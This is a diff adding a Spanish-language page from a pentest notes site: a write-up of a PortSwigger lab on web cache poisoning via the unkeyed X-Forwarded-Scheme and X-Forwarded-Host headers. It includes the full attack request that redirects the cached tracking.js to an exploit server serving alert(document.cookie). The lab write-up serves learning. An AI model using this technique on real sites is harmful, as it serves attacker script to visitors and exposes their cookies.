@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=YA1Jhd8op4g&amp;amp;ab_channel=JarnoTimmermans&quot;&gt;Lab: Web cache poisoning with multiple headers&lt;/a&gt;&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><a href="https://www.youtube.com/watch?v=YA1Jhd8op4g&amp;ab_channel=JarnoTimmermans">Lab: Web cache poisoning with multiple headers</a></p>
+
+<p>Se ha testeado y se ha encontrado que la cabecera  X-Forwarded-Scheme es un unkeyed input.</p>
+<h3 id="para-qué-sirve-x-forwarded-scheme">¿Para qué sirve <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code>?</h3>
+
+<p>Cuando un servidor intermedio como un proxy o un balanceador de carga está involucrado en una conexión, podría modificar el esquema de la solicitud por razones de seguridad o eficiencia. Por ejemplo:</p>
+<ul>
+  <li>Un cliente puede hacer una solicitud HTTPS a un proxy que luego convierte esa solicitud a HTTP antes de reenviarla al servidor final.</li>
+  <li>El encabezado <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code> permite que el servidor final sepa si la solicitud original fue HTTPS o HTTP, incluso si el proxy ha cambiado el esquema.</li>
+</ul>
+
+<p>Este encabezado puede ser útil para:</p>
+<ul>
+  <li><strong>Aplicar configuraciones de seguridad</strong>: Permitir que el servidor responda con seguridad según el esquema original.</li>
+  <li><strong>Redireccionar o modificar respuestas</strong>: Si un servidor necesita forzar HTTPS, puede leer <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code> para decidir si debe redirigir al cliente a HTTPS.</li>
+</ul>
+
+<h3 id="ejemplo-de-una-solicitud-con-x-forwarded-scheme">Ejemplo de una solicitud con <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code></h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/recurso</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ejemplo.com</span>
+<span class="na">X-Forwarded-Scheme</span><span class="p">:</span> <span class="s">https</span>
+</code></pre></div></div>
+
+<p>Aquí, el encabezado <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme: https</code> indica que la solicitud original fue HTTPS, aunque podría haber sido transformada a HTTP por un proxy antes de llegar al servidor final.</p>
+
+<h3 id="uso-en-ataques-de-envenenamiento-de-caché">Uso en ataques de envenenamiento de caché</h3>
+
+<p>El encabezado <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code> también puede ser una entrada sin clave (unkeyed input) en un servidor, lo que significa que su valor podría no influir en la decisión de la caché. Esto puede explotarse en un ataque de envenenamiento de caché si el servidor utiliza el valor de este encabezado para generar la respuesta, pero la caché lo ignora.</p>
+
+<ol>
+  <li>
+    <p><strong>Manipulación de <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code></strong>: Si puedes enviar solicitudes con diferentes valores de <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code> (por ejemplo, cambiando entre <code class="language-plaintext highlighter-rouge">http</code> y <code class="language-plaintext highlighter-rouge">https</code>), el servidor podría generar respuestas ligeramente diferentes. ==Sin embargo, si la caché no incluye <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code> en la clave de caché==, puede almacenar una respuesta “envenenada”.</p>
+  </li>
+  <li>
+    <p><strong>Inyección de contenido malicioso</strong>: Si el valor de <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme</code> cambia cómo el servidor genera los enlaces o redirecciones (por ejemplo, generando URLs que comiencen con <code class="language-plaintext highlighter-rouge">http</code> o <code class="language-plaintext highlighter-rouge">https</code>), podrías manipular el esquema para forzar la generación de contenido no deseado o inseguro en la respuesta en caché.</p>
+  </li>
+  <li>
+    <p><strong>Resultado</strong>: La respuesta manipulada se guarda en caché, de modo que las solicitudes posteriores que coincidan con la clave de caché reciben una respuesta que podría contener URLs inseguras o contenido envenenado.</p>
+  </li>
+</ol>
+
+<p>Este tipo de ataque funciona especialmente bien en servidores que confían en los encabezados <code class="language-plaintext highlighter-rouge">X-Forwarded</code> sin validarlos adecuadamente o que no incluyen esos encabezados en la clave de caché.</p>
+
+<ol>
+  <li>Si cambias a <code class="language-plaintext highlighter-rouge">X-Forwarded-Scheme: http</code> y pones un Caché Buster, te va redirigir a la url pero con https, si lo vuelves a cambiar a https no te redirige, la cosa es que detecta si estás usando https para , en el caso contrario, redirigirte.</li>
+  <li>Volvemos a guess headers y encontramos <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> que también es otro unkeyed input y que si queda reflejado en el output.</li>
+  <li>Podemos usarlo para redirigir a una página maliciosa, en concreto podemos aprovecharnos de <code class="language-plaintext highlighter-rouge">/resources/images/tracker.gif</code> :</li>
+</ol>
+
+<pre><code class="language-request">HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 21
+X-Cache: hit
+Content-Length: 70
+
+document.write('&lt;img src="/resources/images/tracker.gif?page=post"&gt;');
+</code></pre>
+
+<p>Podemos cargar en <code class="language-plaintext highlighter-rouge">https://exploit-0a4e004c04dd8c28815524050189000a.exploit-server.net/resources/images/tracker.gif</code> : alert(document.cookie);</p>
+
+<pre><code class="language-request">GET /resources/js/tracking.js HTTP/2
+Host: 0abb001904808c8381d325fe0080003e.web-security-academy.net
+Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+X-Forwarded-Scheme: http
+X-Forwarded-Host: exploit-0a4e004c04dd8c28815524050189000a.exploit-server.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0abb001904808c8381d325fe0080003e.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: es-ES,es;q=0.9
+Priority: u=0, i
+</code></pre>
+
+<p>Entonces cuando se cargue / se cargará el script del recurso <code class="language-plaintext highlighter-rouge">https://exploit-0a4e004c04dd8c28815524050189000a.exploit-server.net/resources/js/tracking.js</code> y se ejecutará la alerta.</p>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
